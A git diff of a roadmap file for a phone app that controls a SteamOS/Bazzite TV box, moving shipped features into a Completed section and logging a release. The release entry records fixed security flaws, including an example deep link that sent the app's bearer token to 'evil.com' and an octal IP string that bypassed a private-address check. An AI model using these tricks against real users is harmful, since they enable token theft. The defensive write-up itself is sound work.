@@ -111,69 +111,6 @@ Entry fields: `priority` (P0 blocker → P3 nice) · `risk` · `affects` · `dep
   around, not fixed). Worth reading that before designing — a reinstall button that papers
   over a known root cause is worse than fixing the cause.
 
-### Launch non-Steam shortcuts from the phone (Netflix, Hulu, EmuDeck, …)
-- **priority:** P1 · **risk:** low · **affects:** agent + app · **depends_on:** none
-- **SHIPPED 2026-07-26** — kept here as the record of what it fixed.
-- On SteamOS/Bazzite, `shortcuts.vdf` is how EVERYTHING that is not a Steam game
-  reaches the TV: Bazzite's own `ujust get-media-app` registers Netflix/Hulu/Disney+/
-  Max/Prime Video there, EmuDeck registers its launchers there, and this agent
-  registers its own pairing and screensaver tiles there.
-- **MEASURED on the maintainer's Bazzite box:** `/api/launchers` returned **5** entries
-  (all installed Steam games) while `shortcuts.vdf` held **32**. Every streaming service
-  on the machine was unlaunchable from the phone. After the change: **36 launchers,
-  5 steam + 31 shortcut**, and a live `POST /api/launchers/shortcut:<appid>` put Netflix
-  on the TV.
-- **Allowlist shape:** `shortcut:<appid>` must be all digits AND still present in
-  shortcuts.vdf; argv is rebuilt as `["steam", "steam://rungameid/<gameid>"]` from the
-  agent's own constants plus the validated integer, using the non-Steam encoding
-  `(appid << 32) | 0x02000000`. The shortcut's stored Exe — an arbitrary path Steam
-  holds — is NEVER executed directly; Steam runs it, exactly as pressing the tile would.
-- The agent's own tiles are filtered out, and proven unlaunchable rather than merely
-  unlisted.
-
-### TV pad mode — swipe drives the cursor in tile-sized jumps
-- **priority:** P1 · **risk:** low · **affects:** app only · **depends_on:** none
-- **SHIPPED 2026-07-26.** Kept as the record of why it exists.
-- **The problem, measured:** on SteamOS the streaming services people actually watch are
-  web pages. Arrow keys do NOT navigate them — Chromium has no spatial navigation by
-  default, its `--enable-spatial-navigation` flag is documented to break on any page
-  calling `Element.focus()` (Netflix does), and Firefox removed the feature entirely.
-  Verified on the box: uinput arrow keys moved Steam's own selection (0 px idle vs
-  155,515 px, selection moved exactly two tiles) but a browser tile grid only scrolls.
-- Every shipping Linux TV product converged on driving a CURSOR instead of a focus ring —
-  KDE's purpose-built Aura browser ships `navMode: "vMouse"`. This mode does that, but in
-  tile-sized jumps with a haptic per step, so it FEELS like a d-pad while being a pointer.
-  It therefore works on every service, including the ones with no TV UI at all.
-- **Not a tab.** Revised 2026-07-26 on owner feedback: it is a chip in the surface's top-left
-  corner that flips what a swipe step SENDS (arrow keys for Steam vs pointer jumps for
-  browser apps). The mode row was already full at phone width, and TV is a property of the
-  swipe rather than a separate input device — the segmented control still reads SWIPE.
-- **Auto-switching was investigated and is NOT possible today.** `/api/gaming` reports only
-  session and output — no running app for a Steam-launched shortcut (measured with Netflix
-  up). `/api/media` shows ZERO MPRIS players while Netflix is open but idle; a player only
-  appears once something plays, which is exactly when tile navigation is no longer needed.
-  There is no focused-window endpoint. Auto-switch would need a NEW agent capability
-  reporting the focused window under gamescope.
-- **App-only.** Reuses `SwipeSurface` verbatim — same discrete stepping, same haptic
-  rate-limit, same gesture-termination safety — and only changes what a step SENDS.
-  Nothing is held between steps, so there is no latched axis to release.
-- Step size is a preference (Small/Medium/Large = 160/260/380 px) because "one tile" is
-  not a fixed distance: it depends on the service's grid density and the screen.
-- **The open question got answered, and the answer was no.** Tested from the couch
-  2026-07-26: "it just moves the mouse cursor a bit and you can see the cursor." So uinput
-  pointer motion DOES reach the browser under gamescope — the thing this entry listed as
-  unproven is now proven — but the premise the mode was built on does not hold. The claim
-  above ("it FEELS like a d-pad while being a pointer") assumed the jump would land ON
-  something. A d-pad moves a focus ring the app draws; this moves a visible cursor, and a
-  browser tile grid has no focus model for a jump to land on, so nothing highlights and the
-  step size is just a distance. Hiding the cursor would be worse, not better: with no focus
-  ring, the cursor is the only feedback there is. Bigger steps overshoot different things.
-- **Demoted to opt-in 2026-07-26 (`tvNavEnabled`, default OFF)** rather than removed. It is
-  still the right shape on any surface that DOES draw focus, and the machinery is shared
-  with SWIPE so it costs nothing to keep. Labelled UNPOLISHED in Preferences, in the copy,
-  so nobody turns it on expecting a TV remote. Do not promote it back to default-on without
-  a focused-window capability to snap against — that is the missing piece, not step tuning.
-
 ### Packaged media shortcuts, installable from the phone
 - **priority:** P2 · **risk:** medium · **affects:** agent + app · **depends_on:** shortcut
   launching (shipped 2026-07-26)
@@ -233,33 +170,6 @@ Entry fields: `priority` (P0 blocker → P3 nice) · `risk` · `affects` · `dep
 - Creating/removing tiles is state-changing, so it needs the bearer token, a capability
   key (all five edit sites), and tests proving a non-allowlisted service_id registers
   nothing.
-
-### Media seek buttons (-10s / +10s) on the now-playing card
-- **priority:** P2 · **risk:** low · **affects:** app only · **depends_on:** none
-- **Requested by u/Most-Bet2021 (r/SteamOS, 2026-07-26):** "a button that fast forwards media
-  or goes back like 10+ seconds".
-- **The agent side already exists in full — this is an app-only change.** Verified by reading
-  the source, not grepping for absence: `POST /api/media/<player>/seek` with
-  `{"position_ms": int}` is live (agent ~13034), `"seek"` is already in `MPRIS_OPS`
-  (agent 7672), and `_mpris_seek` (agent 7888) prefers `SetPosition` with the current trackid
-  and falls back to a relative `Seek` delta for players that reject it. The GET snapshot
-  already returns `position_ms`, `length_ms` and `can_seek` (agent 7850-7853), which is
-  everything the app needs to compute an offset. The app's `MediaOp` union already includes
-  `'seek'` (api.ts:517).
-- **So the work is:** two buttons in the transport row of `NowPlayingCard.tsx`, reusing the
-  `send('seek', { position_ms })` path the scrub bar already uses (NowPlayingCard.tsx:105-108).
-  Clamp to `[0, length_ms]`, gate on `can_seek` exactly as the bar does.
-- **Why it is worth doing even though the scrub bar exists:** the bar needs a precise tap on a
-  thin target from the couch. Discrete ±10s is the "what did they just say" / "skip the intro"
-  gesture, and it is the one the request actually named.
-- **No allowlist, capability, or endpoint work.** Nothing new reaches D-Bus: the op is still
-  looked up in the closed `MPRIS_OPS` table and the player name is re-validated against a
-  fresh `ListNames` before use.
-- **Unverified:** whether a seek actually lands on the players people use in Game Mode. On
-  bazzite.local `playerctl` is NOT installed (only `mpris-proxy`, which is BlueZ's AVRCP
-  bridge, not a player) — the agent shells `busctl` instead, which IS present. Needs a live
-  test with Chrome/Firefox/Plex/Kodi flatpaks actually playing, and `can_seek` observed both
-  true and false.
 
 ### Two-way clipboard (box <-> phone)
 - **priority:** P2 · **risk:** low · **affects:** agent + app · **depends_on:** none
@@ -416,19 +326,6 @@ recommendation was wrong, not merely superseded.
   the gesture opt-in.
 - **Unverified:** whether the existing surfaces survive a landscape re-layout at all; no
   screen has ever been rendered rotated.
-
-### App Store listing revamp + fresh screenshots
-- **priority:** P1 · **risk:** medium (public listing; App Review 2.3.1 + licensing) · **affects:**
-  store metadata + assets only · **depends_on:** build-target decision
-- **Recon + plan done 2026-07-23.** Live listing (id 6786884115, v2.9.21) fetched for real: copy +
-  screenshots are **build-65 / 2.9.12-era** and show none of the reactor skin, TV control, gaming/
-  battery cards, Fleet, or PIN pairing. Also found a **live licensing violation** ("The whole
-  project — app and agent — is open source" — app is source-available, not open source).
-- Full plan (shot-list, copy draft, Apple 2026 spec, iOS-Simulator capture method, open decisions)
-  in `docs/memory/project_appstore-revamp.md`.
-- **Gating decisions before generating:** (1) does the copy cross the TV-marketing lockstep line
-  now; (2) shoot against live 2.9.21 vs cut a fresh release off main first; (3) stage a real box for
-  the Launch cover-art hero. Nothing published without maintainer go-ahead (public content).
 
 ### Auto-drop the phone's pad while a real game runs (opt-in input-mode switch)
 - **priority:** P2 · **risk:** medium (churn if debounce is wrong) · **affects:** app only ·
@@ -587,6 +484,145 @@ recommendation was wrong, not merely superseded.
 ---
 
 ## ✅ Completed
+
+### App Store listing revamp + fresh screenshots — SHIPPED 2026-07-24 (app 2.9.23)
+- **priority:** P1 · **risk:** medium (public listing; App Review 2.3.1 + licensing) · **affects:**
+  store metadata + assets only · **depends_on:** build-target decision
+- **Recon + plan done 2026-07-23.** Live listing (id 6786884115, v2.9.21) fetched for real: copy +
+  screenshots are **build-65 / 2.9.12-era** and show none of the reactor skin, TV control, gaming/
+  battery cards, Fleet, or PIN pairing. Also found a **live licensing violation** ("The whole
+  project — app and agent — is open source" — app is source-available, not open source).
+- Full plan (shot-list, copy draft, Apple 2026 spec, iOS-Simulator capture method, open decisions)
+  in `docs/memory/project_appstore-revamp.md`.
+- **Gating decisions before generating:** (1) does the copy cross the TV-marketing lockstep line
+  now; (2) shoot against live 2.9.21 vs cut a fresh release off main first; (3) stage a real box for
+  the Launch cover-art hero. Nothing published without maintainer go-ahead (public content).
+- **DONE 2026-07-24 with app 2.9.23.** Both store descriptions rewritten (TV control,
+  Fleet, battery, PIN pairing added), the **licensing violation FIXED** ("open-source
+  agent, source-available app"), and iOS + iPad screenshots pushed to BOTH stores
+  (7 phone + 5 tablet), verified by reading the listings back rather than trusting the
+  upload's exit code. Capture method that produced them: iPhone 17 Pro Max / iPad Pro
+  13" Simulator + deep-link pair + simctl + PIL bezel/caption, BETA badge painted out.
+
+
+### 2026-07-27 — Release 2.9.30 (app 2.9.30 / agent 2.9.60) + three security fixes
+- **Shipped:** iOS build 99 submitted to App Store review; Android versionCode 66 LIVE on
+  Play production; agent 2.9.60 published as signed release assets. Tag `v2.9.30`.
+- **App:** in-app QR pairing scanner (hardware-verified); "Boots into" card (Game Mode /
+  Desktop / Last used); non-Steam shortcuts in Launch; one-flick-one-step swipe; TV mode
+  demoted to off-by-default beta; Display / Audio readout card on Console.
+- **Agent:** boot session default; display + audio probes (gamescopectl / kscreen-doctor /
+  DRM+EDID, HDR and VRR reported as STATE not capability); flatpak update completion via
+  the update PROCESS rather than a count an EOL runtime pins above zero (KI-036).
+- **Security, all found by adversarial review rather than by failure:**
+  - **KI-033** — `isValidLanIp` accepted `010.1.1.5` as private while `inet_aton` resolves
+    it to the PUBLIC 8.1.1.5. Guarded an unauthenticated ping response that becomes a
+    bearer-token destination. Rule moved to import-free `lib/lanIp.ts` with a corpus.
+  - **KI-034** — `DeepLink` accepted ANY host, so `couchside://setup?host=evil.com` added a
+    public box and the app beaconed the token to it. Now behind `parsePairLink`, plus a
+    choke-point gate inside `addBox` so future callers start closed.
+  - **KI-035** — `arrayBuffer()` with no cap on screen frames and album art; a huge body
+    was buffered whole then base64-amplified. Capped both sides.
+  - **KI-037** — every agent update restarted Decky Loader, reloading every OTHER plugin
+    the user has. Now skipped unless our panel actually changed. Surfaced by a user report
+    of an unrelated plugin at 27 GiB "right after updating your app" — not our leak, but
+    our restart is what made another plugin's growth look like ours.
+- **Process:** `release-agent.sh` now states which AGENT version it publishes onto which
+  APP release tag, and warns on a same-version republish — the tag/version mismatch had
+  caused a stale publish. Store notes for both stores were stale ("New in 2.9.29") and
+  were rewritten; Play gets its own 500-char file.
+
+
+### Launch non-Steam shortcuts from the phone (Netflix, Hulu, EmuDeck, …)
+- **priority:** P1 · **risk:** low · **affects:** agent + app · **depends_on:** none
+- **SHIPPED 2026-07-26** — kept here as the record of what it fixed.
+- On SteamOS/Bazzite, `shortcuts.vdf` is how EVERYTHING that is not a Steam game
+  reaches the TV: Bazzite's own `ujust get-media-app` registers Netflix/Hulu/Disney+/
+  Max/Prime Video there, EmuDeck registers its launchers there, and this agent
+  registers its own pairing and screensaver tiles there.
+- **MEASURED on the maintainer's Bazzite box:** `/api/launchers` returned **5** entries
+  (all installed Steam games) while `shortcuts.vdf` held **32**. Every streaming service
+  on the machine was unlaunchable from the phone. After the change: **36 launchers,
+  5 steam + 31 shortcut**, and a live `POST /api/launchers/shortcut:<appid>` put Netflix
+  on the TV.
+- **Allowlist shape:** `shortcut:<appid>` must be all digits AND still present in
+  shortcuts.vdf; argv is rebuilt as `["steam", "steam://rungameid/<gameid>"]` from the
+  agent's own constants plus the validated integer, using the non-Steam encoding
+  `(appid << 32) | 0x02000000`. The shortcut's stored Exe — an arbitrary path Steam
+  holds — is NEVER executed directly; Steam runs it, exactly as pressing the tile would.
+- The agent's own tiles are filtered out, and proven unlaunchable rather than merely
+  unlisted.
+
+### TV pad mode — swipe drives the cursor in tile-sized jumps
+- **priority:** P1 · **risk:** low · **affects:** app only · **depends_on:** none
+- **SHIPPED 2026-07-26.** Kept as the record of why it exists.
+- **The problem, measured:** on SteamOS the streaming services people actually watch are
+  web pages. Arrow keys do NOT navigate them — Chromium has no spatial navigation by
+  default, its `--enable-spatial-navigation` flag is documented to break on any page
+  calling `Element.focus()` (Netflix does), and Firefox removed the feature entirely.
+  Verified on the box: uinput arrow keys moved Steam's own selection (0 px idle vs
+  155,515 px, selection moved exactly two tiles) but a browser tile grid only scrolls.
+- Every shipping Linux TV product converged on driving a CURSOR instead of a focus ring —
+  KDE's purpose-built Aura browser ships `navMode: "vMouse"`. This mode does that, but in
+  tile-sized jumps with a haptic per step, so it FEELS like a d-pad while being a pointer.
+  It therefore works on every service, including the ones with no TV UI at all.
+- **Not a tab.** Revised 2026-07-26 on owner feedback: it is a chip in the surface's top-left
+  corner that flips what a swipe step SENDS (arrow keys for Steam vs pointer jumps for
+  browser apps). The mode row was already full at phone width, and TV is a property of the
+  swipe rather than a separate input device — the segmented control still reads SWIPE.
+- **Auto-switching was investigated and is NOT possible today.** `/api/gaming` reports only
+  session and output — no running app for a Steam-launched shortcut (measured with Netflix
+  up). `/api/media` shows ZERO MPRIS players while Netflix is open but idle; a player only
+  appears once something plays, which is exactly when tile navigation is no longer needed.
+  There is no focused-window endpoint. Auto-switch would need a NEW agent capability
+  reporting the focused window under gamescope.
+- **App-only.** Reuses `SwipeSurface` verbatim — same discrete stepping, same haptic
+  rate-limit, same gesture-termination safety — and only changes what a step SENDS.
+  Nothing is held between steps, so there is no latched axis to release.
+- Step size is a preference (Small/Medium/Large = 160/260/380 px) because "one tile" is
+  not a fixed distance: it depends on the service's grid density and the screen.
+- **The open question got answered, and the answer was no.** Tested from the couch
+  2026-07-26: "it just moves the mouse cursor a bit and you can see the cursor." So uinput
+  pointer motion DOES reach the browser under gamescope — the thing this entry listed as
+  unproven is now proven — but the premise the mode was built on does not hold. The claim
+  above ("it FEELS like a d-pad while being a pointer") assumed the jump would land ON
+  something. A d-pad moves a focus ring the app draws; this moves a visible cursor, and a
+  browser tile grid has no focus model for a jump to land on, so nothing highlights and the
+  step size is just a distance. Hiding the cursor would be worse, not better: with no focus
+  ring, the cursor is the only feedback there is. Bigger steps overshoot different things.
+- **Demoted to opt-in 2026-07-26 (`tvNavEnabled`, default OFF)** rather than removed. It is
+  still the right shape on any surface that DOES draw focus, and the machinery is shared
+  with SWIPE so it costs nothing to keep. Labelled UNPOLISHED in Preferences, in the copy,
+  so nobody turns it on expecting a TV remote. Do not promote it back to default-on without
+  a focused-window capability to snap against — that is the missing piece, not step tuning.
+
+### Media seek buttons (-10s / +10s) on the now-playing card
+- **priority:** P2 · **risk:** low · **affects:** app only · **depends_on:** none
+- **Requested by u/Most-Bet2021 (r/SteamOS, 2026-07-26):** "a button that fast forwards media
+  or goes back like 10+ seconds".
+- **The agent side already exists in full — this is an app-only change.** Verified by reading
+  the source, not grepping for absence: `POST /api/media/<player>/seek` with
+  `{"position_ms": int}` is live (agent ~13034), `"seek"` is already in `MPRIS_OPS`
+  (agent 7672), and `_mpris_seek` (agent 7888) prefers `SetPosition` with the current trackid
+  and falls back to a relative `Seek` delta for players that reject it. The GET snapshot
+  already returns `position_ms`, `length_ms` and `can_seek` (agent 7850-7853), which is
+  everything the app needs to compute an offset. The app's `MediaOp` union already includes
+  `'seek'` (api.ts:517).
+- **So the work is:** two buttons in the transport row of `NowPlayingCard.tsx`, reusing the
+  `send('seek', { position_ms })` path the scrub bar already uses (NowPlayingCard.tsx:105-108).
+  Clamp to `[0, length_ms]`, gate on `can_seek` exactly as the bar does.
+- **Why it is worth doing even though the scrub bar exists:** the bar needs a precise tap on a
+  thin target from the couch. Discrete ±10s is the "what did they just say" / "skip the intro"
+  gesture, and it is the one the request actually named.
+- **No allowlist, capability, or endpoint work.** Nothing new reaches D-Bus: the op is still
+  looked up in the closed `MPRIS_OPS` table and the player name is re-validated against a
+  fresh `ListNames` before use.
+- **Unverified:** whether a seek actually lands on the players people use in Game Mode. On
+  bazzite.local `playerctl` is NOT installed (only `mpris-proxy`, which is BlueZ's AVRCP
+  bridge, not a player) — the agent shells `busctl` instead, which IS present. Needs a live
+  test with Chrome/Firefox/Plex/Kodi flatpaks actually playing, and `can_seek` observed both
+  true and false.
+
 
 ### In-app QR pairing scanner (Netflix-style) — SHIPPED 2026-07-27
 - **priority:** P1 · **risk:** med (new bearer-token ingress) · **affects:** app only
